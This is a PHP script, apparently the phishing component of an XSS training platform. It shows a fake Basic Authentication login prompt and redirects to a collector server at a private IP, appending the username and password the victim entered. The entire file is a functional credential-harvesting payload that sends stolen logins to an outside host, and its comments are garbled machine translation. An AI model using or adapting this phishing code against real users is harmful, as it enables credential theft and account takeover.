<?php
error_reporting(0);
// var_dump($_SERVER);
if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
//Authentication，AndGiveOfinfo
    header('Content-type:text/html;charset=utf-8');
    header("WWW-Authenticate: Basic realm='Authentication'");
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization Required.';
    exit;
} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
//WillEndResultGiveSearchSetInformationOfBackground,PleaseWillHereOfIPAddressModifyForBackgroundOfIP
    header("Location: http://192.168.1.15/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}
    &password={$_SERVER[PHP_AUTH_PW]}");
}

?>